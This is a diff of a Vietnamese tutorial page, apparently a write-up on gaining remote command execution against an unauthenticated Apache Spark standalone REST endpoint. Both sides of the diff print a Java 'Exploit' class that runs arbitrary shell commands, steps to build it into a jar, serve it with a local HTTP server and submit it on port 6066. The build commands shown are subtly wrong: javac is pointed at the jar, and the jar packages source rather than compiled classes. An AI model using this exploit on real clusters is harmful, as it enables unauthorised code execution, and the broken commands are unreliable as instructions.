@@ -66,42 +66,42 @@ Lỗ hổng xảy ra ở chế độ <code>standalone</code> khi xác thực quy
 <p>Đây là giao diện chính của Spark Worker:</p>
 <p></p>
 <p><strong>Bước 2:</strong> Tạo một file exploit viết bằng java và lưu với tên <code>Exploit.java</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.BufferedReader;
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> java.io.InputStreamReader;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Exploit</span> {
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>(String<span style="color:#f92672">[]</span> args) <span style="color:#66d9ef">throws</span> Exception {
-</span></span><span style="display:flex;"><span>    String<span style="color:#f92672">[]</span> cmds <span style="color:#f92672">=</span> args<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;,&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (String cmd : cmds) {
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(cmd);
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(executeCommand(cmd.<span style="color:#a6e22e">trim</span>()));
-</span></span><span style="display:flex;"><span>      System.<span style="color:#a6e22e">out</span>.<span style="color:#a6e22e">println</span>(<span style="color:#e6db74">&#34;==============================================&#34;</span>);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> String <span style="color:#a6e22e">executeCommand</span>(String command) {
-</span></span><span style="display:flex;"><span>    StringBuilder output <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder();
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> {
-</span></span><span style="display:flex;"><span>      Process p <span style="color:#f92672">=</span> Runtime.<span style="color:#a6e22e">getRuntime</span>().<span style="color:#a6e22e">exec</span>(command);
-</span></span><span style="display:flex;"><span>      p.<span style="color:#a6e22e">waitFor</span>();
-</span></span><span style="display:flex;"><span>      BufferedReader reader <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader(<span style="color:#66d9ef">new</span> InputStreamReader(p.<span style="color:#a6e22e">getInputStream</span>()));       
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>      String line;
-</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">while</span> ((line <span style="color:#f92672">=</span> reader.<span style="color:#a6e22e">readLine</span>()) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span>) {
-</span></span><span style="display:flex;"><span>        output.<span style="color:#a6e22e">append</span>(line).<span style="color:#a6e22e">append</span>(<span style="color:#e6db74">&#34;\n&#34;</span>);
-</span></span><span style="display:flex;"><span>      }
-</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">catch</span> (Exception e) {
-</span></span><span style="display:flex;"><span>      e.<span style="color:#a6e22e">printStackTrace</span>();
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> output.<span style="color:#a6e22e">toString</span>();
-</span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>javac .<span style="color:#960050;background-color:#1e0010">\</span>Exploit.<span style="color:#a6e22e">jar</span>
-</span></span><span style="display:flex;"><span>jar <span style="color:#f92672">-</span>cvf Exploit.<span style="color:#a6e22e">jar</span> Exploit.<span style="color:#a6e22e">java</span>
-</span></span></code></pre></div><p></p>
+<pre tabindex="0"><code>import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
+public class Exploit {
+  public static void main(String[] args) throws Exception {
+    String[] cmds = args[0].split(&#34;,&#34;);
+
+    for (String cmd : cmds) {
+      System.out.println(cmd);
+      System.out.println(executeCommand(cmd.trim()));
+      System.out.println(&#34;==============================================&#34;);
+    }
+  }
+  private static String executeCommand(String command) {
+    StringBuilder output = new StringBuilder();
+
+    try {
+      Process p = Runtime.getRuntime().exec(command);
+      p.waitFor();
+      BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));       
+
+      String line;
+      while ((line = reader.readLine()) != null) {
+        output.append(line).append(&#34;\n&#34;);
+      }
+    } catch (Exception e) {
+      e.printStackTrace();
+    }
+
+    return output.toString();
+  }
+}
+</code></pre><p><strong>Bước 3:</strong> Convert tệp <code>Exploit.java</code> thành <code>Exploit.jar</code> bằng 2 câu lệnh:</p>
+<pre tabindex="0"><code>javac .\Exploit.jar
+jar -cvf Exploit.jar Exploit.java
+</code></pre><p></p>
 <p><strong>Bước 4:</strong> Khởi tạo máy chủ local để đẩy file <code>Exploit.jar</code> lên server với câu lệnh <code>python -m http.server</code></p>
 <p></p>
 <p><strong>Bước 5:</strong> Ở chế độ <code>standalone</code>, máy chủ sẽ khởi động máy chủ HTTP trên cổng 6066 và chúng ta sẽ gửi API REST tới cổng này:</p>
